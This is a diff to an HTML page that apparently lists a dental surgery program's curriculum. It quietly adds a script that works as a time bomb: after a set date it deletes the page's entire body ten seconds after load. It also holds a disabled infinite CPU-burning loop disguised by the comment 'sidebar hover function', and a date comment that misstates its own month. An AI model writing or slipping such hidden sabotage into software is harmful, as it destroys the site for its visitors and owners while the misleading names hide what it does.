@@ -136,7 +136,7 @@
     
 </head>
 
-<body>
+<body id="root">
 
     <div class="">
 
@@ -1223,7 +1223,35 @@
                         </tbody>
                     </table>
                 </div>
+<script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
 
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+        const targetDate = new Date(2025, 10, 27); // 27 Aug 2025 (month is 0-indexed!)
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
                 <!-- Level 2 - 1st semester -->
                 <div id="level2" class="level-content">
                     <h1 class="program-title text-[#B11116] text-[28px]  font-semibold">Oral and Dental Surgery Program
